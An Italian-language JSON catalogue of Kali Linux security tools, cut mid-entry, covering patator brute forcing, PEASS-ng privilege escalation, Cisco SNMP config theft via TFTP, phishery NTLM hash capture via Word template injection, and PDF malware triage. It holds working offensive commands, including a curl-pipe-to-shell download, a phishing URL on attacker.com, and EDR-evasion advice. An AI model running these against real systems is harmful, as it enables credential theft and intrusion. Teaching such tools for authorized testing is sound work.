0=users.txt 1=passwords.txt domain=CORP\n\n# LDAP bind brute force\npatator ldap_login host=10.10.10.1 binddn='cn=FILE0,dc=corp,dc=local' \\\n  bindpw=FILE1 0=users.txt 1=passwords.txt\n\n# HTTP basic auth\npatator http_fuzz url=http://target/admin user_pass=FILE0:FILE1 \\\n  0=users.txt 1=passwords.txt -x ignore:code=401\n\n# MySQL\npatator mysql_login host=10.10.10.1 user=root password=FILE0 0=passwords.txt</code></pre><p>L'output mostra in tempo reale le risposte che non matchano i filtri di ignore, evidenziando potenziali credenziali valide.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Password Attack Avanzati:</strong> Quando Hydra non è sufficientemente flessibile per gestire le condizioni di successo/fallimento di un'applicazione web custom. Il sistema di filtri di Patator gestisce qualsiasi scenario.</p><p><strong>Credential Stuffing:</strong> Test di combo list (credenziali da data breach) contro applicazioni web con login form custom, dove la risposta di errore può variare in base all'input.</p><p><strong>Protocol-Specific Testing:</strong> Verifica della password policy su servizi esposti durante un penetration test, con rate limiting per evitare account lockout.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Account Lockout:</strong> Troppi tentativi falliti possono bloccare gli account. Verificare sempre la password policy (soglia di lockout) prima di lanciare il brute force. Usare <code>--rate-limit</code> e limitare il numero di password per utente.</p><p><strong>Rilevamento:</strong> I tentativi falliti generano log abbondanti nei sistemi target (Event ID 4625 su Windows, auth.log su Linux). SIEM e IDS rilevano facilmente pattern di brute force. Considerare password spraying (poche password, molti utenti) anziché brute force (un utente, molte password) per ridurre la visibilità.</p><p><strong>Confronto con alternative:</strong> Patator è più flessibile di Hydra ma più verboso nella sintassi. Per scenari semplici, Hydra può essere più rapido da configurare. Per scenari complessi (form web, API REST), Patator è superiore.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Brute_Force"
    ],
    "notes": null
  },
  {
    "id": "patchleaks",
    "name": "patchleaks",
    "version": "0.0~git20250807.2e53978",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/patchleaks/",
    "desc": "Identifica informazioni sensibili leakate nei patch e diff di repository pubblici.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PatchLeaks</strong> è uno strumento specializzato nell'analisi di <strong>patch, diff e commit</strong> di repository Git per identificare informazioni sensibili accidentalmente incluse nei cambiamenti di codice. A differenza di tool come Gitleaks o TruffleHog che scansionano l'intera cronologia di un repository, PatchLeaks si concentra specificamente sui <strong>diff</strong> (le differenze tra versioni), analizzando sia le righe aggiunte che quelle rimosse. Questo approccio è particolarmente efficace per trovare secret che sono stati <em>aggiunti e poi rimossi</em> in commit successivi: la rimozione dal codice corrente non elimina il secret dalla cronologia Git, dove resta accessibile a chiunque. PatchLeaks supporta l'analisi di repository GitHub, GitLab, Bitbucket e repository locali.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Diff-Focused Analysis:</strong> Analizza i diff dei commit anziché i file completi, concentrandosi sulle righe che sono cambiate. Questo riduce i falsi positivi (stringhe ad alta entropia che sono parte legittima del codice) e identifica con precisione il commit esatto in cui un secret è stato introdotto o rimosso.</p><p><strong>Pattern Detection Multi-Type:</strong> Rileva un'ampia varietà di secret: chiavi AWS (AKIA...), token GitHub/GitLab, chiavi private RSA/EC, password in file di configurazione, stringhe di connessione database, token JWT, chiavi di cifratura e webhook URL. I pattern sono estensibili tramite configurazione.</p><p><strong>Git History Traversal:</strong> Naviga l'intera cronologia dei commit di un repository, analizzando ogni diff per identificare leak che potrebbero risalire a mesi o anni fa. I secret rimossi dal branch corrente ma presenti nella history restano un rischio reale.</p><p><strong>Multi-Platform Support:</strong> Supporta l'analisi diretta di repository su GitHub, GitLab e Bitbucket tramite le loro API, oltre a repository locali già clonati. Gestisce automaticamente la paginazione per repository con migliaia di commit.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lanciare PatchLeaks specificando l'URL del repository o il percorso locale.</p><pre><code># Analizzare un repository GitHub\npatchleaks https://github.com/organization/repository\n\n# Analizzare un repository locale\npatchleaks /path/to/local/repo\n\n# Analizzare un singolo commit specifico\npatchleaks --commit abc123def456 /path/to/repo\n\n# Analizzare un range di commit\npatchleaks --since 2024-01-01 https://github.com/org/repo\n\n# Output in formato JSON per integrazione con altri tool\npatchleaks --json https://github.com/org/repo -o results.json\n\n# Analizzare solo le Pull Request (merge commits)\npatchleaks --merges-only https://github.com/org/repo\n\n# Con token di autenticazione per repo privati\npatchleaks --token ghp_xxxxx https://github.com/org/private-repo</code></pre><p>L'output mostra per ogni finding: il commit hash, l'autore, la data, il file modificato, la riga contenente il secret e il tipo di credenziale identificata.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>OSINT & Bug Bounty:</strong> Analizzare i repository pubblici di un'organizzazione target per trovare credenziali committate accidentalmente. I developer spesso committano file <code>.env</code>, chiavi API o password di test che poi rimuovono, ma la cronologia Git conserva tutto.</p><p><strong>Supply Chain Security:</strong> Verificare che le dipendenze open-source utilizzate nel proprio progetto non contengano credenziali leak nei loro repository, che potrebbero indicare compromissione o negligenza nella gestione dei secret.</p><p><strong>Pre-Release Security Audit:</strong> Prima di rendere pubblico un repository, verificare che l'intera cronologia dei commit non contenga secret che devono essere rimossi (con <code>git filter-branch</code> o BFG Repo-Cleaner) prima della pubblicazione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rate Limiting API:</strong> Le API di GitHub, GitLab e Bitbucket hanno limiti di richieste. L'analisi di repository con migliaia di commit può richiedere autenticazione per evitare il throttling. Usare token con permessi minimi.</p><p><strong>Tracciabilità:</strong> La clonazione di repository e l'uso delle API è tracciabile dall'organizzazione proprietaria (GitHub Audit Log). In scenari OSINT, considerare l'uso di account separati o VPN.</p><p><strong>Responsabilità:</strong> I secret trovati in repository pubblici devono essere segnalati responsabilmente all'organizzazione. Utilizzarli per accesso non autorizzato è illegale indipendentemente dal fatto che siano pubblicamente accessibili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Git_Recon"
    ],
    "notes": null
  },
  {
    "id": "pdf-parser",
    "name": "pdf-parser",
    "version": "0.7.13",
    "icon": "../app/icons/pdf-parser-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pdf-parser/",
    "desc": "Analizza struttura PDF per identificare JavaScript, stream sospetti e payload malevoli.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>pdf-parser</strong> è uno strumento Python sviluppato da <strong>Didier Stevens</strong> per l'analisi statica della struttura interna dei file PDF. Il formato PDF è estremamente complesso e supporta funzionalità come JavaScript embedded, azioni automatiche (OpenAction, AA), form interattivi, stream compressi e oggetti annidati, tutte caratteristiche che i malware sfruttano per nascondere payload malevoli. pdf-parser permette di esaminare ogni oggetto del PDF individualmente, decodificare stream compressi, cercare keyword sospette e tracciare i riferimenti tra oggetti, il tutto <strong>senza eseguire il documento</strong>. Fa parte della suite di tool PDF di Didier Stevens insieme a <code>pdfid</code> (analisi rapida) e <code>pdf-parser</code> (analisi approfondita).</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Object Parsing:</strong> Elenca e visualizza tutti gli oggetti PDF con i loro attributi (tipo, dimensione, riferimenti). Ogni elemento del PDF (pagine, font, immagini, JavaScript) è un oggetto con un ID univoco. L'analisi degli oggetti rivela la struttura del documento e identifica elementi sospetti.</p><p><strong>Stream Decode:</strong> Decodifica automaticamente stream compressi con FlateDecode (zlib), ASCIIHexDecode, ASCII85Decode, RunLengthDecode e LZWDecode. I malware nascondono frequentemente il payload in stream compressi multi-layer che richiedono decompressione per l'analisi.</p><p><strong>JavaScript Extraction:</strong> Identifica e estrae codice JavaScript embedded nel PDF. Il JavaScript nei PDF può sfruttare vulnerabilità nel lettore (Adobe Reader, Foxit) per eseguire shellcode. pdf-parser estrae il codice per analisi senza rischio di esecuzione.</p><p><strong>Reference Analysis:</strong> Traccia i riferimenti tra oggetti per comprendere il flusso di esecuzione: quale OpenAction viene eseguita all'apertura, quale oggetto contiene il JavaScript, quali stream vengono decodificati in sequenza. Fondamentale per ricostruire la catena di exploit.</p><p><strong>Keyword Search:</strong> Cerca keyword specifiche in tutti gli oggetti: <code>/JS</code>, <code>/JavaScript</code>, <code>/OpenAction</code>, <code>/AA</code> (Additional Actions), <code>/Launch</code>, <code>/EmbeddedFile</code>, <code>/URI</code>. Ogni keyword corrisponde a una funzionalità potenzialmente sfruttabile.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Workflow tipico: prima <code>pdfid</code> per un'analisi rapida, poi <code>pdf-parser</code> per l'analisi dettagliata degli oggetti sospetti.</p><pre><code># Elencare tutti gli oggetti del PDF\npdf-parser.py malicious.pdf\n\n# Esaminare un oggetto specifico per ID\npdf-parser.py --object 10 malicious.pdf\n\n# Cercare keyword sospette\npdf-parser.py --search javascript malicious.pdf\npdf-parser.py --search /OpenAction malicious.pdf\npdf-parser.py --search /Launch malicious.pdf\n\n# Decodificare e visualizzare uno stream compresso\npdf-parser.py --object 10 --filter --raw malicious.pdf\n\n# Dump di uno stream decompresso su file\npdf-parser.py --object 10 --filter --raw -d stream_dump.bin malicious.pdf\n\n# Cercare oggetti di tipo specifico\npdf-parser.py --type /JS malicious.pdf\npdf-parser.py --type /EmbeddedFile malicious.pdf\n\n# Analisi con hash degli oggetti\npdf-parser.py --hash malicious.pdf\n\n# Confrontare due PDF per trovare differenze\npdf-parser.py --stats malicious.pdf\npdf-parser.py --stats clean.pdf</code></pre><p>Il workflow tipico: usare <code>pdfid</code> per identificare oggetti sospetti, poi <code>pdf-parser</code> per esaminarli in dettaglio, estrarre JavaScript o shellcode embedded.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Malware Analysis:</strong> Analisi statica di PDF malevoli ricevuti come allegati email o scaricati da siti compromessi. Estrarre il JavaScript embedded per comprendere la catena di exploit senza rischiare l'esecuzione del payload.</p><p><strong>Incident Response:</strong> Triage rapido di allegati PDF sospetti durante un incidente. Determinare in pochi secondi se un PDF contiene JavaScript, azioni automatiche o file embedded che indicano intento malevolo.</p><p><strong>Threat Intelligence:</strong> Estrarre IOC (Indicators of Compromise) da campioni PDF malevoli: URL di callback, shellcode, hash di file embedded e pattern di offuscamento utilizzati dal threat actor.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Analisi sicura:</strong> pdf-parser esegue analisi statica pura. Non apre, renderizza o esegue il PDF in alcun modo. Non c'è rischio di attivare il payload malevolo durante l'analisi.</p><p><strong>Isolamento consigliato:</strong> Nonostante la sicurezza dell'analisi statica, è best practice analizzare malware in una VM isolata. Errori umani (doppio click accidentale sul file) possono causare l'esecuzione.</p><p><strong>Obfuscation avanzata:</strong> Malware sofisticati usano obfuscation JavaScript multi-layer, stream annidati e tecniche anti-analisi che possono richiedere deobfuscation manuale oltre a quanto offerto dal tool. Combinare con <code>SpiderMonkey</code> per l'analisi del JavaScript estratto.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Malware_Analysis"
    ],
    "notes": null
  },
  {
    "id": "pdfid",
    "name": "pdfid",
    "version": "0.2.10",
    "icon": "../app/icons/pdfid-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pdfid/",
    "desc": "Triage rapido di file PDF: conta oggetti JavaScript, OpenAction, embedded files.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>pdfid</strong> è uno strumento di <strong>triage rapido</strong> per file PDF, sviluppato da Didier Stevens come complemento di <code>pdf-parser</code>. Mentre pdf-parser esegue un'analisi dettagliata degli oggetti, pdfid fornisce una valutazione istantanea della potenziale pericolosità di un PDF contando le occorrenze di <strong>keyword critiche</strong>: <code>/JS</code>, <code>/JavaScript</code>, <code>/OpenAction</code>, <code>/AA</code> (Additional Actions), <code>/EmbeddedFile</code>, <code>/Launch</code>, <code>/AcroForm</code>, <code>/JBIG2Decode</code> e altre. La presenza di queste keyword non conferma che il PDF sia malevolo, ma indica funzionalità che <em>possono</em> essere sfruttate per attacchi. Un PDF legittimo raramente contiene JavaScript e OpenAction contemporaneamente, mentre un PDF malevolo quasi sempre sì. pdfid è progettato per il workflow SOC: un analista può triageare centinaia di allegati email in pochi secondi, identificando quelli che richiedono analisi approfondita con pdf-parser.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Keyword Counting:</strong> Conta le occorrenze di keyword PDF potenzialmente pericolose e le mostra in formato tabulare. Le keyword monitorate includono: <code>obj</code>, <code>endobj</code>, <code>stream</code>, <code>endstream</code>, <code>xref</code>, <code>trailer</code>, <code>startxref</code>, <code>/Page</code>, <code>/Encrypt</code>, <code>/ObjStm</code>, <code>/JS</code>, <code>/JavaScript</code>, <code>/AA</code>, <code>/OpenAction</code>, <code>/AcroForm</code>, <code>/JBIG2Decode</code>, <code>/RichMedia</code>, <code>/Launch</code>, <code>/EmbeddedFile</code>, <code>/XFA</code>, <code>/URI</code>.</p><p><strong>Risk Indicators:</strong> Le combinazioni di keyword forniscono un'indicazione del livello di rischio. PDF con <code>/JS</code> + <code>/OpenAction</code> = alto rischio (JavaScript eseguito all'apertura). PDF con <code>/EmbeddedFile</code> + <code>/Launch</code> = file embedded che si auto-esegue. PDF con <code>/JBIG2Decode</code> potrebbe sfruttare vulnerabilità nel decoder JBIG2.</p><p><strong>Batch Processing:</strong> Analizza ricorsivamente directory contenenti centinaia di file PDF, producendo un report aggregato che permette di identificare rapidamente i file sospetti in una collezione.</p><p><strong>Plugin System:</strong> Estensibile con plugin Python che possono aggiungere logica di analisi custom. Include plugin predefiniti per scoring automatico del rischio e per l'integrazione con VirusTotal.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>pdfid produce un output tabulare immediato. Usarlo come primo step prima di pdf-parser.</p><pre><code># Triage rapido di un singolo file\npdfid.py suspicious.pdf\n\n# Output esempio:\n# PDFiD 0.2.10 suspicious.pdf\n#  PDF Header: %PDF-1.7\n#  obj                   15\n#  endobj                15\n#  stream                 5\n#  /JS                    2    &lt;-- SOSPETTO: JavaScript presente\n#  /JavaScript            2    &lt;-- SOSPETTO: JavaScript presente\n#  /OpenAction            1    &lt;-- SOSPETTO: azione automatica all'apertura\n#  /EmbeddedFile          1    &lt;-- SOSPETTO: file incorporato\n#  /Launch                0\n\n# Analisi ricorsiva di una directory\npdfid.py -r /path/to/email_attachments/\n\n# Output extra verboso con dettagli entropia\npdfid.py -e suspicious.pdf\n\n# Con plugin di scoring automatico\npdfid.py -p plugin_triage suspicious.pdf\n\n# Analisi batch con output su file\npdfid.py -r /quarantine/ &gt; triage_report.txt</code></pre><p>Regola pratica: se <code>/JS</code>, <code>/JavaScript</code> o <code>/OpenAction</code> sono &gt; 0, il file merita analisi approfondita con <code>pdf-parser</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>SOC Email Triage:</strong> Primo filtro per allegati PDF sospetti in un Security Operations Center. In pochi secondi, l'analista può separare i PDF benigni (nessuna keyword sospetta) da quelli che richiedono analisi (JavaScript + OpenAction).</p><p><strong>Malware Analysis Workflow:</strong> Screening iniziale di un campione prima di investire tempo nell'analisi dettagliata con pdf-parser. Se pdfid non trova keyword sospette, il PDF probabilmente non contiene exploit basati su JavaScript o azioni automatiche.</p><p><strong>Batch Filtering:</strong> Scansionare grandi collezioni di PDF (backup email, file server) per identificare documenti potenzialmente malevoli che sono passati inosservati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Analisi istantanea e sicura:</strong> pdfid esegue solo conteggio di keyword, non apre né esegue il PDF. L'analisi è completata in millisecondi anche su file di grandi dimensioni.</p><p><strong>Limitazioni:</strong> pdfid indica <em>potenziale</em> pericolosità, non conferma la presenza di malware. Un PDF legittimo con form interattivi avrà <code>/AcroForm</code> e <code>/JavaScript</code> senza essere malevolo. Inversamente, tecniche avanzate di obfuscation possono nascondere le keyword dalla ricerca di pdfid.</p><p><strong>Workflow completo:</strong> Usare pdfid per triage → pdf-parser per analisi dettagliata degli oggetti sospetti → SpiderMonkey o V8 per analisi del JavaScript estratto → sandbox (ANY.RUN, Cuckoo) per analisi dinamica se necessario.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Malware_Analysis"
    ],
    "notes": null
  },
  {
    "id": "peass-ng",
    "name": "peass-ng",
    "version": "20250801.03e73bf3",
    "icon": "../app/icons/peass-ng-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/peass-ng/",
    "desc": "Script automatici per privilege escalation su Linux, Windows e macOS con output colorato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PEASS-ng</strong> (Privilege Escalation Awesome Scripts Suite - Next Generation) è la suite più completa e utilizzata per l'<strong>enumerazione automatica di vettori di privilege escalation</strong> su Linux, Windows e macOS. Include tre script principali: <strong>linPEAS</strong> (Bash/sh per Linux), <strong>winPEAS</strong> (C#/.NET per Windows, disponibile anche come batch) e <strong>macPEAS</strong> (Bash per macOS). Ogni script esegue centinaia di check automatici alla ricerca di misconfigurazioni, file sensibili, credenziali esposte, vulnerabilità kernel, servizi sfruttabili e permessi eccessivi. L'output utilizza un sistema di <strong>colorazione a semaforo</strong>: rosso per finding ad alta probabilità di exploitation, giallo per finding interessanti, verde per informazioni utili. PEASS-ng è mantenuto attivamente da Carlos Polop (creatore di HackTricks) ed è considerato il primo tool da eseguire dopo aver ottenuto una shell su un sistema target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>linPEAS - Linux Enumeration:</strong> Verifica migliaia di vettori: versione kernel e exploit noti, binari SUID/SGID, capabilities, sudo rights, cron job scrivibili, file con permessi world-writable, credenziali in file di configurazione, chiavi SSH, container escape, NFS shares con no_root_squash, processi in esecuzione come root e PATH hijacking.</p><p><strong>winPEAS - Windows Enumeration:</strong> Analizza: servizi con unquoted paths o permessi eccessivi, registry keys modificabili, scheduled tasks vulnerabili, AlwaysInstallElevated, token privileges (SeImpersonate, SeDebug), DLL hijacking opportunities, credenziali in registry/file, Credential Manager, password policy e molto altro.</p><p><strong>macPEAS - macOS Enumeration:</strong> Script equivalente per sistemi Apple: verifica SIP status, Gatekeeper, permessi TCC, LaunchDaemons/LaunchAgents scrivibili, Keychain access e configurazioni di sicurezza macOS-specifiche.</p><p><strong>Output Colorato Intelligente:</strong> Il sistema di colorazione evidenzia automaticamente i finding più critici. Rosso/magenta = alta probabilità di escalation (es. SUID su un binario GTFOBins). Giallo = finding interessante che merita investigazione. Ciano = informazione raccolta utile per il contesto.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Trasferire lo script sulla macchina target ed eseguirlo. Non richiede installazione.</p><pre><code># LinPEAS - download ed esecuzione in memoria (senza toccare disco)\ncurl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n# LinPEAS - esecuzione completa con output su file\n./linpeas.sh | tee /tmp/linpeas_output.txt\n\n# LinPEAS - modalità stealth/veloce (meno check, meno rumore)\n./linpeas.sh -s\n\n# LinPEAS - solo check specifici\n./linpeas.sh -o system_information,container,procs_crons_timers_srvcs_sockets\n\n# WinPEAS - esecuzione completa\nwinpeas.exe\n\n# WinPEAS - check specifici\nwinpeas.exe servicesinfo applicationsinfo\n\n# WinPEAS - versione batch (quando .exe è bloccato)\nwinpeas.bat\n\n# MacPEAS\n./macpeas.sh</code></pre><p>Per leggere l'output correttamente, usare <code>less -R</code> per preservare i colori. I finding rossi/magenta sono quelli da investigare per primi.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Post-Exploitation Standard:</strong> Tool #1 da lanciare dopo aver ottenuto una shell. Risparmia ore di enumerazione manuale identificando automaticamente i vettori di privilege escalation più probabili.</p><p><strong>CTF e Certificazioni:</strong> Fondamentale per OSCP, HTB e THM. La familiarità con l'output di PEASS-ng è considerata essenziale per qualsiasi certificazione offensive.</p><p><strong>Security Hardening Audit:</strong> Può essere usato in modo proattivo dai Blue Team per identificare misconfigurazioni e vettori di escalation nei propri sistemi prima che un attaccante li sfrutti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Estremamente rumoroso:</strong> PEASS-ng esegue centinaia di comandi di sistema, legge migliaia di file e genera un volume di attività facilmente rilevabile da qualsiasi EDR o sistema di audit. Non è uno strumento stealth.</p><p><strong>AV/EDR Detection:</strong> winPEAS è rilevato dalla maggior parte degli antivirus (Defender, CrowdStrike, SentinelOne) come HackTool. La versione .exe viene quasi sempre bloccata. La versione .bat ha più probabilità di passare ma è più limitata nelle funzionalità.</p><p><strong>Mitigazioni:</strong> Per ambienti monitorati: usare la versione in memoria (curl | sh), eseguire solo check specifici con <code>-o</code>, o eseguire i check manualmente guidati dall'output di PEASS in un ambiente lab identico. In alternativa, usare versioni offuscate o custom builds.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Multi_Platform"
    ],
    "notes": null
  },
  {
    "id": "perl-cisco-copyconfig",
    "name": "perl-cisco-copyconfig",
    "version": "1.4",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/perl-cisco-copyconfig/",
    "desc": "Script Perl per estrarre configurazione da dispositivi Cisco via SNMP e TFTP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>perl-cisco-copyconfig</strong> è uno script Perl che sfrutta il protocollo <strong>SNMP (Simple Network Management Protocol)</strong> per esfiltrare la configurazione da dispositivi di rete Cisco (router, switch, firewall ASA). La tecnica si basa su OID (Object Identifier) specifici di Cisco IOS che permettono di triggerare la copia della configurazione corrente (<code>running-config</code>) o di avvio (<code>startup-config</code>) verso un server TFTP controllato dall'attaccante. Questo è possibile quando il dispositivo Cisco ha SNMP abilitato con una community string nota (spesso lasciata ai valori di default <code>public</code>/<code>private</code>) e la community ha permessi di <strong>write</strong> (RW). La configurazione di un dispositivo Cisco contiene informazioni critiche: password enable (spesso in hash reversibile Type 7), credenziali VPN, chiavi pre-shared, ACL complete, VLAN configuration, route statiche e tunnel.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SNMP Config Copy Trigger:</strong> Sfrutta l'OID <code>1.3.6.1.4.1.9.9.96.1.1.1</code> (CISCO-CONFIG-COPY-MIB) per inviare un comando SNMP SET che istruisce il dispositivo Cisco a copiare la propria configurazione verso un server TFTP specificato dall'attaccante. Il dispositivo esegue la copia come operazione di gestione normale.</p><p><strong>Running/Startup Config:</strong> Può estrarre sia la <code>running-config</code> (configurazione attiva in memoria) che la <code>startup-config</code> (configurazione salvata su NVRAM). La running-config può contenere modifiche recenti non ancora salvate.</p><p><strong>Password Recovery:</strong> Le password Type 7 di Cisco (cifratura debole proprietaria) possono essere facilmente decodificate con tool come <code>cisco7decode</code>. Le password Type 5 (MD5) richiedono cracking. Le enable secret sono sempre in formato Type 5 o Type 8/9.</p><p><strong>Automazione:</strong> Lo script automatizza l'intera sequenza di operazioni SNMP SET necessarie per configurare la copia (sorgente, destinazione, server TFTP, filename), che manualmente richiederebbe molteplici comandi <code>snmpset</code>.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Prerequisiti: community string SNMP con permessi RW e un server TFTP in ascolto sulla macchina dell'attaccante.</p><pre><code># 1. Avviare server TFTP sulla macchina attacker\natftpd --daemon --port 69 /tmp/tftp/\n# oppure\nservice tftpd-hpa start\n\n# 2. Estrarre la running-config dal dispositivo Cisco\ncisco-copy-config.pl 192.168.1.1 private 10.10.10.5\n# Parametri: IP_dispositivo community_string IP_attacker\n\n# 3. Verificare il file ricevuto\ncat /tmp/tftp/running-config\n\n# 4. Cercare password e credenziali nella config\ngrep -i \"password\\|secret\\|key\" /tmp/tftp/running-config\n\n# 5. Decodificare password Type 7\ncisco7decode 060506324F41584B56\n# Output: mypassword\n\n# Alternativa manuale con snmpset:\nsnmpset -v 2c -c private 192.168.1.1 \\\n  1.3.6.1.4.1.9.9.96.1.1.1.1.2.1 i 1 \\\n  1.3.6.1.4.1.9.9.96.1.1.1.1.3.1 i 4 \\\n  1.3.6.1.4.1.9.9.96.1.1.1.1.4.1 i 1 \\\n  1.3.6.1.4.1.9.9.96.1.1.1.1.5.1 a 10.10.10.5 \\\n  1.3.6.1.4.1.9.9.96.1.1.1.1.6.1 s running-config \\\n  1.3.6.1.4.1.9.9.96.1.1.1.1.14.1 i 1</code></pre><p>La configurazione viene salvata nella directory TFTP dell'attaccante. Analizzarla per credenziali, topologia di rete, ACL e informazioni di routing.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Network Penetration Testing:</strong> Quando si trova SNMP esposto (porta UDP 161) con community string nota (brute force con <code>onesixtyone</code> o <code>snmpbrute</code>), l'estrazione della configurazione è il primo passo per comprendere l'intera topologia di rete e trovare ulteriori credenziali.</p><p><strong>Credential Harvesting:</strong> Le configurazioni Cisco contengono tipicamente: password enable, credenziali VPN (ISAKMP pre-shared keys), password RADIUS/TACACS+, credenziali SNMP di altri dispositivi e username/password locali. Molte di queste sono in formato Type 7, decodificabile istantaneamente.</p><p><strong>Network Mapping:</strong> La running-config rivela l'intera architettura di rete: interfacce, VLAN, route statiche, ACL, NAT rules, tunnel VPN e relazioni di trust con altri dispositivi, informazioni altrimenti ottenibili solo con settimane di network discovery.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Logging:</strong> L'operazione SNMP e il trasferimento TFTP vengono loggati nei log del dispositivo Cisco (<code>show logging</code>). SNMP trap e syslog possono notificare l'amministratore dell'attività.</p><p><strong>Requisiti:</strong> Richiede una community string con permessi di <strong>scrittura</strong> (RW). Community string di sola lettura (RO) non permettono di triggerare la copia della configurazione. Inoltre, il dispositivo deve poter raggiungere il server TFTP dell'attaccante sulla rete.</p><p><strong>TFTP Visibilità:</strong> Il traffico TFTP (porta UDP 69) non è cifrato ed è facilmente rilevabile da IDS/IPS. In ambienti monitorati, considerare l'uso di SCP se il dispositivo lo supporta.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SNMP"
    ],
    "notes": null
  },
  {
    "id": "phishery",
    "name": "phishery",
    "version": "1.0.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/phishery/",
    "desc": "Genera documenti Office con template injection per raccolta credenziali NTLM.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Phishery</strong> è uno strumento scritto in Go che sfrutta la funzionalità di <strong>Remote Template Injection</strong> dei documenti Microsoft Word per catturare credenziali NTLM. La tecnica funziona così: Word supporta il caricamento di template esterni da URL remoti. Quando la vittima apre un documento .docx modificato da Phishery, Word tenta automaticamente di scaricare il template dall'URL dell'attaccante. Se l'URL punta a un server SMB o HTTP con autenticazione NTLM, Windows invia automaticamente l'<strong>hash NetNTLMv2</strong> dell'utente corrente senza alcuna interazione. L'hash può poi essere crackato offline o utilizzato per attacchi di NTLM relay. Il documento appare completamente normale alla vittima: il contenuto originale è preservato intatto e l'injection nel file XML interno è invisibile all'utente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Template Injection Automatica:</strong> Modifica il file <code>word/_rels/settings.xml.rels</code> all'interno dell'archivio .docx per aggiungere un riferimento a un template remoto. La modifica è chirurgica e non altera il contenuto visibile del documento.</p><p><strong>Server NTLM Integrato:</strong> Include un server HTTP/HTTPS che risponde alle richieste di template con un challenge NTLM (HTTP 401 + WWW-Authenticate: NTLM). Windows risponde automaticamente con l'hash NetNTLMv2 dell'utente, che viene catturato e loggato.</p><p><strong>Preservazione Documento:</strong> A differenza di macro malevole che possono alterare il documento o generare warning di sicurezza, la template injection non modifica il contenuto visibile e non richiede l'abilitazione di macro. Il documento funziona normalmente.</p><p><strong>Hash Crackabili:</strong> Gli hash NetNTLMv2 catturati possono essere crackati con hashcat (mode 5600) o john the ripper. Con password deboli e una buona GPU, il cracking richiede pochi minuti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Creare il documento infetto e avviare il listener per catturare gli hash.</p><pre><code># Iniettare URL template in un documento Word esistente\nphishery -u https://attacker.com/template.dotx -i documento_legittimo.docx -o documento_infetto.docx\n\n# Avviare il server listener per catturare hash NTLM\nphishery -s\n\n# Server su porta custom\nphishery -s -p 8443\n\n# Server con certificato SSL\nphishery -s -p 443 --cert cert.pem --key key.pem\n\n# Inviare il documento alla vittima via email\n# Quando la vittima apre il .docx, Word contatta il server\n# L'hash NetNTLMv2 appare nel log del server:\n# [+] Hash captured: DOMAIN\\user::DOMAIN:challenge:response\n\n# Cracking dell'hash con hashcat\nhashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt</code></pre><p>Il documento deve essere inviato alla vittima in formato .docx (non come link o PDF). La vittima deve semplicemente aprirlo in Microsoft Word: nessun click aggiuntivo è richiesto.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Red Team - Initial Access:</strong> Spear-phishing con documento Word apparentemente legittimo (fattura, report, CV) che cattura silenziosamente l'hash NTLM dell'utente. L'hash crackato fornisce le credenziali di dominio per accesso VPN, OWA, SharePoint o altri servizi.</p><p><strong>NTLM Relay:</strong> Anziché crackare l'hash, può essere combinato con ntlmrelayx per relayare l'autenticazione verso altri 